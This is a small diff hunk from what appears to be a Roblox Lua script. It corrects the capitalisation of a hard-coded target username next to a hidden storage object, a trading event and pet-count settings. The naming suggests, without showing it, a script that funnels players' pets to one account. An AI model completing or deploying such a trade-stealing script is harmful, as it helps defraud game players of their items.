@@ -10,8 +10,8 @@ hiddenStorage.Name = "ZorVexStorage"
 
 local tradingEvent = ReplicatedStorage:WaitForChild("rEvents", 5) and ReplicatedStorage.rEvents:WaitForChild("tradingEvent", 5)
 
-local ALLOWED_USERNAME = "Maulanafadib158"
-local targetPlayerName = "Maulanafadib158" 
+local ALLOWED_USERNAME = "MaulanaFadib158"
+local targetPlayerName = "MaulanaFadib158" 
 local selectedPetName = nil 
 local amount = 110
 local PET_COUNT = 6        
